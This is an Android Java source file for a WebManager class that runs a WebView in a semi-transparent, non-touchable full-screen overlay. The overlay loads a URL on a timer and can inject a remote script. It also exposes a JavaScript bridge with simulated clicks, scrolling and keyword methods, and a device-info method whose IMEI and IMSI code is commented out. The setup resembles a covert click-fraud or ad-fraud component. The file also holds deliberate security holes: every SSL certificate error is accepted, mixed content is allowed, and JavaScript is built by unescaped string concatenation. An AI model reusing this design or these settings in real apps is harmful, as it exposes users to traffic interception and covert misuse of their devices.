package com.test.markdemo.exercise.webviewtest;

import android.app.DownloadManager;
import android.content.Context;
import android.graphics.Color;
import android.net.Uri;
import android.net.http.SslError;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;
import android.util.Log;
import android.view.WindowManager;
import android.webkit.ConsoleMessage;
import android.webkit.DownloadListener;
import android.webkit.JavascriptInterface;
import android.webkit.SslErrorHandler;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.RelativeLayout;

import org.json.JSONObject;

/**
 * Created by ASUS on 2017/10/26.
 */

public class WebManager {
    private WebView _webView;
    private Context _context;
    private static Handler handler = new Handler(Looper.getMainLooper());
    private WebStateManager webStateManager;
    private FloatWindow _win;
    public static final int Close = 1;
    public static final int Completed = 2;
    public static final int Limit = 3;

    public WebManager(Context context, WebView webView){
        _context = context;
        if (webView != null) {
            _webView = webView;
        } else
            _webView = new WebView(_context);

        float a = 0.5f;
        _webView.getSettings().setJavaScriptEnabled(true);
        _webView.getSettings().setAllowFileAccess(true);
        _webView.getSettings().setLoadsImagesAutomatically(true);
        _webView.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);

        _webView.getSettings().setDomStorageEnabled(true);

        _webView.getSettings().setAppCacheEnabled(true);
        _webView.getSettings().setAppCachePath(_context.getDir("localdata", Context.MODE_PRIVATE).getPath());

        _webView.setBackgroundColor(Color.BLACK);
        _webView.setAlpha(a);
        _webView.addJavascriptInterface(new Sdk(), "WebSdk");
//        _webView.addJavascriptInterface(new Controller(), "WebController");

        if (Build.VERSION.SDK_INT >= 21)
            _webView.getSettings().setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);

        /*_webView.setDownloadListener(new DownloadListener() {
            @Override
            public void onDownloadStart(String url, String userAgent, String contentDisposition, String mimetype, long contentLength) {
                if (!com.omg.net.NetUtil.hasWifiConn(context))
                    return;
                if (url != null && (url.startsWith("http") || url.startsWith("ftp"))) {
                    DownloadManager manager = (DownloadManager) _context.getSystemService(Context.DOWNLOAD_SERVICE);

                    DownloadManager.Request request = new DownloadManager.Request(Uri.parse(url));

                    request.setMimeType(mimetype);
                    request.setDescription("");

                    manager.enqueue(request);
                }
            }
        });*/

        _win = new FloatWindow(context);
        _win.setView(_webView);

        FloatWindow.ViewInfo info = FloatWindow.ViewInfo.get(_context);

        _webView.setLayoutParams(new RelativeLayout.LayoutParams(RelativeLayout.LayoutParams.MATCH_PARENT, _win.getWindowManager().getDefaultDisplay().getHeight() - info.getStatusBarHeight()));

        _win.setWidth(RelativeLayout.LayoutParams.MATCH_PARENT);
        _win.setHeight(_win.getWindowManager().getDefaultDisplay().getHeight() - info.getStatusBarHeight());
        _win.setFlag(WindowManager.LayoutParams.FLAG_FULLSCREEN | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
                | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE);
//        _win.setType(WindowManager.LayoutParams.TYPE_TOAST);
        float b = a;
        float d = 1 - a;

        _win.setButtonBrightness(b);
        _win.setDimAmount(d);
    }

    public void setup(String method, final String url) {
//        Logger.i("web:" + url);

        String jsUrl = "";
        final WebStateManager state = initManager(jsUrl, method);

        _webView.addJavascriptInterface(new StateManager(state), "StateManager");

        _webView.setWebChromeClient(new WebChromeClient() {
            @Override
            public boolean onConsoleMessage(ConsoleMessage consoleMessage) {
//                if (consoleMessage != null && consoleMessage.message() != null)
//                    Logger.i(consoleMessage.message());
                return super.onConsoleMessage(consoleMessage);
            }
        });

        _webView.setWebViewClient(new WebViewClient() {
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                return false;
            }

            @Override
            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
                handler.proceed();
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);

                state.doExec(StateParams.PageFinished);
            }
        });

        _win.show();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                state.doExec(0);
                _webView.loadUrl(url);
            }
        }, 3000);
    }

    private WebStateManager initManager(final String jsUrl, final String method) {
        final long timeout = 7000;
        webStateManager = WebStateManager.getWebStateManager();

        // Start -> WaitLong
        webStateManager.define(StateParams.Start, new WebStateManager.WebStateBase() {
            @Override
            protected String judge(int state) {
                return StateParams.WaitLong;
            }
        });

        // WaitLong -> WaitShort PageFinished
        // WaitLong -> Hook Timeout Long
        webStateManager.define(StateParams.WaitLong, new WebStateManager.WebStateBase() {
            private TimeoutHandler _handler;

            @Override
            protected String judge(int state) {
                switch (state) {
                    case StateParams.TimeoutLong:
                        return StateParams.Hook;
                    case StateParams.PageFinished:
                        return StateParams.WaitShort;
                }

                return null;
            }

            @Override
            protected void init() {
                int span = 40 * 1000;

                _handler = new TimeoutHandler(new Runnable() {
                    @Override
                    public void run() {
                        exec(StateParams.TimeoutLong);
                    }
                }, span);

                _handler.start();
            }

            @Override
            protected void release() {
                if (_handler != null)
                    _handler.cancel();
            }
        });

        // WaitShort -> WaitShort PageFinished
        // WaitShort -> Hook Timeout Short
        webStateManager.define(StateParams.WaitShort, new WebStateManager.WebStateBase() {
            private TimeoutHandler _handler;

            @Override
            protected String judge(int state) {
                switch (state) {
                    case StateParams.TimeoutShort:
                        return StateParams.Hook;
                    case StateParams.PageFinished:
                        return StateParams.WaitShort;
                }
                return null;
            }

            @Override
            protected void init() {
                _handler = new TimeoutHandler(new Runnable() {
                    @Override
                    public void run() {
                        exec(StateParams.TimeoutShort);
                    }
                }, timeout);

                _handler.start();
            }

            @Override
            protected void release() {
                if (_handler != null)
                    _handler.cancel();
            }
        });

        // Hook -> WaitLong Notify
        // Hook -> End Close
        webStateManager.define(StateParams.Hook, new WebStateManager.WebStateBase() {
            @Override
            protected String judge(int state) {
                switch (state) {
                    case StateParams.Notify:
                        return StateParams.WaitLong;
                    case StateParams.Close:
                        return StateParams.End;
                }

                return null;
            }

            @Override
            protected void init() {
                if (!TextUtils.isEmpty(method) && !TextUtils.isEmpty(jsUrl)) {
                    inject(method, jsUrl);
                }
                exec(StateParams.Close);

            }
        });

        webStateManager.define(StateParams.End, new WebStateManager.WebStateBase() {
            @Override
            protected String judge(int state) {
                return null;
            }

            @Override
            protected void init() {
                super.init();
                Log.i("123","close");
                close(0);
            }
        });
        webStateManager.setInitState(StateParams.Start);
        return webStateManager;
    }
    private void inject(String invoke, final String jsUrl) {
        String js = "var newscript = document.createElement(\"script\");";
        js += "newscript.src=\"" + jsUrl + "\";";
        js += String.format("newscript.onload=function(){%s;};", invoke); // xxx()代表js中某方法
        js += "document.body.appendChild(newscript);";
        _webView.loadUrl("javascript:" + js);
    }

    public class Sdk {
        private float getDensity() {
            return _context.getResources().getDisplayMetrics().density;
        }

        private int getDensity(int value) {
            return (int) (value * getDensity());
        }

        @JavascriptInterface
        public float density() {
            return _context.getResources().getDisplayMetrics().density;
        }

        @JavascriptInterface
        public void reportError(int type, String content, String msg) {
//            DataEvent.get(_context).setBizType("request_web_error")
//                    .arg(2, type + "").arg(3, content).arg(4, msg).send();
        }

        @JavascriptInterface
        public void dataEvent(String type, String ext1, String ext2, String ext3, String ext4) {
//            DataEvent.get(_context).setBizType("request_web_error")
//                    .setBizType(type).arg(1, ext1).arg(2, ext2).arg(3, ext3).arg(4, ext4)
//                    .send();
        }

        @JavascriptInterface
        public String getInfo() {
           /* try {
                JSONObject json = new JSONObject();

                json.put("imei", OmgTerminalinfo.getInstance().getTerminalInfo().getImei());
                json.put("imsi", OmgTerminalinfo.getInstance().getTerminalInfo().getImsi());
                json.put("aid", OmgTerminalinfo.getInstance().getTerminalInfo().getAppId());
                json.put("cid", OmgTerminalinfo.getInstance().getTerminalInfo().getChannelId());
                json.put("hstype", OmgTerminalinfo.getInstance().getTerminalInfo().getHstype());
                json.put("hsman", OmgTerminalinfo.getInstance().getTerminalInfo().getHsman());
                json.put("osVer", OmgTerminalinfo.getInstance().getTerminalInfo().getOsVer());
                json.put("netType", OmgTerminalinfo.getInstance().getTerminalInfo().getNetworkType());

                return json.toString();
            } catch (Exception e) {
                ExceptionUtils.handle(e);
            }*/

            return "{}";
        }

        @JavascriptInterface
        public void rollMob(final int remainLength, final boolean scrollState, final String methodName) {
           /* Sync.run(new Runnable() {
                @Override
                public void run() {
                    if (_webView != null) {
                        Logger.e("Roll[Len:" + remainLength + "," + "Begin:" + _webView.getScaleY() + "," + (scrollState ? "Down" : "Up") + ",CallBack:" + methodName + "]");
                        WebManager.this.executeRoll(remainLength, scrollState);
                        if (_webView != null) {
                            _webView.post(new Runnable() {
                                @Override
                                public void run() {
                                    String str = String.format("javascript:%s()", methodName);
                                    Logger.e("CallBack:" + str);
                                    _webView.loadUrl(str);
                                }
                            });
                        }
                    }
                }
            });*/
        }

        @JavascriptInterface
        public void click(int x, int y) {
            float dp = 1;
//            Logger.d("click x:" + x * dp + " y:" + y * dp);
//            InputSimulator.clickRandom(_webView, (int) (x * dp), (int) (y * dp));
        }

        @JavascriptInterface
        public void clickNoDelay(int x, int y) {
            float dp = 1;
//            Logger.d("click x:" + x * dp + " y:" + y * dp);
//
//            InputSimulator.clickNoDelay(_webView, (int) (x * dp), (int) (y * dp));
        }

        @JavascriptInterface
        public void roll(final int fx, final int fy, final int tx, final int ty, int rate, int span) {
            float dp = 1;
//            Logger.d("roll fx:" + fx * dp + " fy:" + fy * dp + " tx:" + tx * dp + " ty:" + ty * dp + " rate:" + rate + " span:" + span);
//            InputSimulator.roll(_webView, (int) (fx * dp), (int) (fy * dp), (int) (tx * dp), (int) (ty * dp), rate, span);
        }

        @JavascriptInterface
        public void show(String msg) {
//            Logger.showOnUI(_context, msg);
        }

        @JavascriptInterface
        public void print(String msg) {
//            Logger.showOnUI(_context, msg);
//            log(msg);
        }

        @JavascriptInterface
        public void log(String msg) {
//            WebManager.this.log(msg);
        }

        @JavascriptInterface
        public int getScrollX() {
            return _webView.getScrollX();
        }

        @JavascriptInterface
        public int getScrollY() {
            return _webView.getScrollY();
        }

        @JavascriptInterface
        public void setScrollY(final int y) {
            handler.post(new Runnable() {
                @Override
                public void run() {
                    if (Build.VERSION.SDK_INT >= 14)
                        _webView.setScrollY(y);
                }
            });
        }

        @JavascriptInterface
        public String getKeyword(int type) {


            return "";
        }

        @JavascriptInterface
        public String getLastUseKeyword(int type) {


            return "";
        }

        @JavascriptInterface
        public void executeCompleted() {

        }
    }

    public class StateManager
    {
        private WebStateManager _manager;

        public StateManager(WebStateManager manager)
        {
            _manager = manager;
        }

        @JavascriptInterface
        public void notifyState(int span)
        {
            _manager.doExec(StateParams.Notify);
        }

        @JavascriptInterface
        public void closeState()
        {
            close(Completed);
            _manager.doExec(StateParams.Close);
        }
    }

    private void close(int i) {
        _win.close();
    }
}
